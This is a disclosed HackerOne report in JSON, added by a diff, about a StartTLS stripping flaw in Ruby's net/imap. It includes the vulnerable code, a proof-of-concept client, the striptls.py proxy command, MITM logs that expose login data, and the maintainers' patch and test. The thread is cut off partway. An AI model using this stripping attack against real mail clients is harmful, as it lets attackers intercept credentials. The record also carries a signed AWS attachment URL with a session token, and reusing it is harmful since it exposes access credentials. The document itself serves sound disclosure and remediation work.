@@ -1,0 +1,536 @@
+{
+  "id": 1178562,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTc4NTYy",
+  "url": "https://hackerone.com/reports/1178562",
+  "title": "imap: StartTLS stripping attack (CVE-2016-0772).",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-28T16:06:30.462Z",
+  "submitted_at": "2021-04-28T16:06:30.578Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sighook",
+    "url": "/sighook",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-32066",
+    "CVE-2016-0772"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-07-08T15:34:20.176Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-07-08T15:34:20.098Z",
+  "team_member_agreed_on_going_public_at": "2021-07-08T01:09:28.748Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "`net/imap` does not seem to raise an exception when the remote end (imap server)  fails to respond with `tagged_response` (NO/BAD) or `OK` to an explicit call of `imap.starttls`. This may allow a malicious MITM to perform a starttls stripping attack if the client code does not explicitly set `usessl = true` on ` initialize` where it is disabled by default: it is rarely done as one might expect that `starttls` raises an exception when starttls negotiation fails (like when using `usessl` on a server that does not support it or when it fails to negotiate tls due to an ssl exception/cipher mismatch/auth fail).\n\nThe vulnerable code:\n```ruby\n    def starttls(options = {}, verify = true)\n      send_command(\"STARTTLS\") do |resp|\n        if resp.kind_of?(TaggedResponse) && resp.name == \"OK\"\n          begin\n            # for backward compatibility\n            certs = options.to_str\n            options = create_ssl_params(certs, verify)\n          rescue NoMethodError\n          end\n          start_tls_session(options)\n        end # <--- End of handling :)\n      end\n    end\n```\n\n# PoC\n\nFor instance, we have the following client code:\n```ruby\nrequire 'net/imap'\n\nimap = Net::IMAP.new('0.0.0.0', 9999)\nimap.starttls\nimap.login('myLOGIN','myPASSWORD')                                            # test login\n#imap.authenticate('LOGIN', 'joe_user', 'joes_password') # test auth\nimap.disconnect\n```\nStart the proxy: `python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError`\n (See `striptls.py` in attachments).\n\nProxy output:\n```bash\n$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError\n2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected\n2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> connecting to target ('imap.yandex.ru', 143)\n2021-04-28 18:43:27,347 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\\r\\n'\n2021-04-28 18:43:27,348 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>\n2021-04-28 18:43:27,348 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server][mangled] None\n2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\\r\\n'\n...\n```\nAs you can see, `starttls` did not return any error to the client and `LOGIN` authentication started.\n`AUTH` is the same:\n```\n2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None\n2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0002 AUTHENTICATE'\n2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          ' LOGIN\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None\n2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lX3VzZXI=\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None\n2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None\n2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None\n2021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA=='\n2021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          '\\r\\n'\n2021-04-28 18:47:00,635 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server]          'RUBY0002 BAD Command syntax error. sc=PleRNJ32YGk1_281547_4-d4596b06cae3\\r\\n'\n```\n\nI set the same CVSS as CVE-2016-0772 has.\n\n## Impact\n\nAllows man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a \"StartTLS stripping attack.\"",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1281885,
+      "file_name": "striptls.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oo15hcnzlqh4mu5tdbphkk2jlmq0?response-content-disposition=attachment%3B%20filename%3D%22striptls.py%22%3B%20filename%2A%3DUTF-8%27%27striptls.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071117Z&X-Amz-Expires=1824&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb1592a3d31962608ac89236ff4580c74802c775508aadd62908f044a031eaff",
+      "file_size": 80175,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-08-07T01:09:28.877Z",
+  "allow_singular_disclosure_after": -67154508.45133822,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "sw33tlie",
+    "run_win",
+    "ali",
+    "frankiexote",
+    "citril",
+    "666devash_stampede",
+    "ekgaribadmi",
+    "anton_ivanov",
+    "thelilnix"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 11550592,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you. @shugo What do you think?",
+      "automated_response": false,
+      "created_at": "2021-04-28T16:24:55.840Z",
+      "updated_at": "2021-04-28T16:24:55.840Z",
+      "actor": {
+        "username": "mame",
+        "cleared": false,
+        "verified": false,
+        "url": "/mame",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11557358,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for your report.\nI'd like to handle this issue as a vulnerability.",
+      "automated_response": false,
+      "created_at": "2021-04-28T22:12:45.420Z",
+      "updated_at": "2021-04-28T22:12:45.420Z",
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11572411,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@chinarulezzz Could you try the following fix?\nIt raises an Net::IMAP::UnknownResponseError with striptls.py on my box.\n\n```ruby\ncommit ee82fc874a10f76f6e83dc4026a96a805aa0713c\nAuthor: Shugo Maeda <shugo@ruby-lang.org>\nDate:   Fri Apr 30 08:51:27 2021 +0900\n\n    Fix StartTLS stripping vulnerability\n    \n    Reported by Alexandr Savca in https://hackerone.com/reports/1178562\n\ndiff --git a/lib/net/imap.rb b/lib/net/imap.rb\nindex d3f2e25..f9c2822 100644\n--- a/lib/net/imap.rb\n+++ b/lib/net/imap.rb\n@@ -1315,12 +1315,14 @@ module Net\n       end\n       resp = @tagged_responses.delete(tag)\n       case resp.name\n+      when /\\A(?:OK)\\z/ni\n+        return resp\n       when /\\A(?:NO)\\z/ni\n         raise NoResponseError, resp\n       when /\\A(?:BAD)\\z/ni\n         raise BadResponseError, resp\n       else\n-        return resp\n+        raise UnknownResponseError, resp\n       end\n     end\n \n@@ -4121,6 +4123,10 @@ module Net\n     class ByeResponseError < ResponseError\n     end\n \n+    # Error raised upon an unknown response from the server.\n+    class UnknownResponseError < ResponseError\n+    end\n+\n     RESPONSE_ERRORS = Hash.new(ResponseError)\n     RESPONSE_ERRORS[\"NO\"] = NoResponseError\n     RESPONSE_ERRORS[\"BAD\"] = BadResponseError\ndiff --git a/test/net/imap/test_imap.rb b/test/net/imap/test_imap.rb\nindex 4fb9f74..f29fa1f 100644\n--- a/test/net/imap/test_imap.rb\n+++ b/test/net/imap/test_imap.rb\n@@ -127,6 +127,16 @@ class IMAPTest < Test::Unit::TestCase\n         imap.disconnect\n       end\n     end\n+\n+    def test_starttls_stripping\n+      starttls_stripping_test do |port|\n+        imap = Net::IMAP.new(\"localhost\", :port => port)\n+        assert_raise(Net::IMAP::UnknownResponseError) do\n+          imap.starttls(:ca_file => CA_FILE)\n+        end\n+        imap\n+      end\n+    end\n   end\n \n   def start_server\n@@ -883,6 +893,27 @@ EOF\n     end\n   end\n \n+  def starttls_stripping_test\n+    server = create_tcp_server\n+    port = server.addr[1]\n+    start_server do\n+      sock = server.accept\n+      begin\n+        sock.print(\"* OK test server\\r\\n\")\n+        sock.gets\n+        sock.print(\"RUBY0001 BUG unhandled command\\r\\n\")\n+      ensure\n+        sock.close\n+        server.close\n+      end\n+    end\n+    begin\n+      imap = yield(port)\n+    ensure\n+      imap.disconnect if imap && !imap.disconnected?\n+    end\n+  end\n+\n   def create_tcp_server\n     return TCPServer.new(server_addr, 0)\n   end\n```\n\nI don't remember why a block is given to send_command even though it handles only tagged OK response, but I don't fix it to keep the patch simple.\n\n",
+      "automated_response": false,
+      "created_at": "2021-04-30T00:06:12.973Z",
+      "updated_at": "2021-04-30T00:06:12.973Z",
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11575178,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@shugo Tested and LGTM.\n\nP.S.\n\n>I don't remember why a block is given to send_command even though it handles only tagged OK response, but I don't fix it to keep the patch simple.\n\nYeah. And if you plan to fix it in the future, it seems that the second check of `resp.name` is redundant in the following procedure, since an exception is thrown in the case of a non-OK resp?\n\n```ruby\n    def starttls(options = {}, verify = true)\n      send_command(\"STARTTLS\") do |resp|\n        if resp.kind_of?(TaggedResponse) && resp.name == \"OK\" # <--\n```\n\n",
+      "automated_response": false,
+      "created_at": "2021-04-30T08:18:16.723Z",
+      "updated_at": "2021-04-30T08:18:16.723Z",
+      "actor": {
+        "username": "sighook",
+        "cleared": false,
+        "verified": false,
+        "url": "/sighook",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11575283,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Nope. I was wrong. It seems that the client sends to the server encrypted data and _after_ that thrown the `UnknownResponseError`:\n\n```\n2021-04-30 11:24:58,984 - DEBUG    - <Session 0x7f214296e090> [client] => [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-30 11:24:58,985 - DEBUG    - <Session 0x7f214296e090> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-30 11:24:58,985 - DEBUG    - <Session 0x7f214296e090> [client] => [server][mangled] None\n2021-04-30 11:24:58,987 - DEBUG    - <Session 0x7f214296e090> [client] => [server]          '\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03P\\x9a\\x8b=^?\\xdd\\xfe\\xa8\\nY\\xab\\xcc\\xcd\\xcc\\x98\\xda:\\xa2\\xc9\\xad \\x1e,\\'\\xb9\\x04\\xa9\\xdd\\x91\\xb2\\x95\\x00\\x00>\\x13\\x02\\x13\\x03\\x13\\x01\\xc0,\\xc00\\x00\\x9f\\xcc\\xa9\\xcc\\xa8\\xcc\\xaa\\xc0+\\xc0/\\x00\\x9e\\xc0$\\xc0(\\x00k\\xc0#\\xc0\\'\\x00g\\xc0\\n\\xc0\\x14\\x009\\xc0\\t\\xc0\\x13\\x003\\x00\\x9d\\x00\\x9c\\x00=\\x00<\\x005\\x00/\\x00\\xff\\x01\\x00\\x01\\x95\\x00\\x00\\x00\\x0c\\x00\\n\\x00\\x00\\x070.0.0.0\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\n\\x00\\x0c\\x00\\n\\x00\\x1d\\x00\\x17\\x00\\x1e\\x00\\x19\\x00\\x18\\x00#\\x00\\x00\\x00\\x16\\x00\\x00\\x00\\x17\\x00\\x00\\x00\\r\\x000\\x00.\\x04\\x03\\x05\\x03\\x06\\x03\\x08\\x07\\x08\\x08\\x08\\t\\x08\\n\\x08\\x0b\\x08\\x04\\x08\\x05\\x08\\x06\\x04\\x01\\x05\\x01\\x06\\x01\\x03\\x03\\x02\\x03\\x03\\x01\\x02\\x01\\x03\\x02\\x02\\x02\\x04\\x02\\x05\\x02\\x06\\x02\\x00+\\x00\\t\\x08\\x03\\x04\\x03\\x03\\x03\\x02\\x03\\x01\\x00-\\x00\\x02\\x01\\x01\\x003\\x00&\\x00$\\x00\\x1d\\x00 \\x9e\\xec_\"\\x8eF\\x01\\xf5\\xf6H\\x92Y\\x82\\x8f\\xce\\xbb\\x9e&h\\x07\\xddd\\xc4\\x04\\x84\\x17\\xb6\\xa8b,\\xcd\\x12\\x00\\x15\\x00\\xec\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n2021-04-30 11:25:29,019 - WARNING  - <Session 0x7f214296e090> terminated.\n```",
+      "automated_response": false,
+      "created_at": "2021-04-30T08:29:30.989Z",
+      "updated_at": "2021-04-30T08:29:30.989Z",
+      "actor": {
+        "username": "sighook",
+        "cleared": false,
+        "verified": false,
+        "url": "/sighook",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11576046,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@chinarulezzz \n> Yeah. And if you plan to fix it in the future, it seems that the second check of resp.name is redundant in the following procedure, since an exception is thrown in the case of a non-OK resp?\n\nYes, I'll fix it as follows:\n\n```ruby\n        def starttls(options = {}, verify = true)\n          resp = send_command(\"STARTTLS\")\n          begin\n            # for backward compatibility\n            certs = options.to_str\n            options = create_ssl_params(certs, verify)\n          rescue NoMethodError\n          end\n          start_tls_session(options)\n          resp\n        end\n```\n\n> Nope. I was wrong. It seems that the client sends to the server encrypted data and _after_ that thrown the `UnknownResponseError`:\n\nI couldn't reproduce it.\nI got the following result:\n\n```\n2021-04-30 17:47:16,254 - INFO     - <Proxy 0x10d307d50 listen=('0.0.0.0', 9999) target=('imap.yandex.ru', 143)> ready.\n2021-04-30 17:47:16,254 - DEBUG    - * added vector (port:143  , proto:    IMAP): <class __main__.StripWithError at 0x10d309a78>\n2021-04-30 17:47:16,254 - INFO     - <RewriteDispatcher ssl/tls_intercept=False vectors={143: set([<class __main__.StripWithError at 0x10d309a78>])}>\n2021-04-30 17:47:26,092 - DEBUG    - <ProtocolDetect 0x10d3913d0 protocol_id=PROTO_IMAP len_history=0> - protocol detected (target port)\n2021-04-30 17:47:26,093 - INFO     - <Session 0x10d391390> client ('127.0.0.1', 51955) has connected\n2021-04-30 17:47:26,093 - INFO     - <Session 0x10d391390> connecting to target ('imap.yandex.ru', 143)\n2021-04-30 17:47:26,730 - DEBUG    - <Session 0x10d391390> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-e294cef8d474.qloud-c.yandex.net:143 ready to talk with ::ffff:219.105.49.16:51956, 2021-Apr-30 11:47:26, QlZ6ZC0NUCg1\\r\\n'\n2021-04-30 17:47:26,730 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>\n2021-04-30 17:47:26,731 - DEBUG    - <Session 0x10d391390> [client] => [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-30 17:47:26,731 - DEBUG    - <Session 0x10d391390> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-30 17:47:26,732 - DEBUG    - <Session 0x10d391390> [client] => [server][mangled] None\n2021-04-30 17:47:26,733 - WARNING  - session.close(): Exception: error(57, 'Socket is not connected')\n2021-04-30 17:47:26,733 - WARNING  - <Session 0x10d391390> terminated.\n```\n\nHave you changed anything in PoC?",
+      "automated_response": false,
+      "created_at": "2021-04-30T09:00:28.088Z",
+      "updated_at": "2021-04-30T09:00:28.088Z",
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11576341,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": ">Have you changed anything in PoC?\n\nNo. But I don't fixed `starttls` as you. Just removed `resp.name == \"OK\"`:\n\n```ruby\n    def starttls(options = {}, verify = true)\n      send_command(\"STARTTLS\") do |resp|\n        if resp.kind_of?(TaggedResponse)# && resp.name == \"OK\"\n          begin\n            # for backward compatibility\n            certs = options.to_str\n            options = create_ssl_params(certs, verify)\n          rescue NoMethodError\n          end\n          start_tls_session(options)\n        end\n      end\n    end\n```\nThat's a lousy fix, yeah :)\n\nWith your patch i got the same result as you (couldn't reproduce it too). All is fine.\n",
+      "automated_response": false,
+      "created_at": "2021-04-30T09:16:43.187Z",
+      "updated_at": "2021-04-30T09:16:43.187Z",
+      "actor": {
+        "username": "sighook",
+        "cleared": false,
+        "verified": false,
+        "url": "/sighook",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11576628,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> No. But I don't fixed starttls as you.\n\nAh, I see.\n\nSo, I'll fix the vulnerability without the fix of the starttls method (the first patch in https://hackerone.com/reports/1178562#activity-11572411), and fix starttls after the security fix releases. ",
+      "automated_response": false,
+      "created_at": "2021-04-30T09:46:32.589Z",
+      "updated_at": "2021-04-30T09:46:32.589Z",
+      "actor": {
+        "username": "shugo",
+        "cleared": false,
+        "verified": false,
+        "url": "/shugo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11650077,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
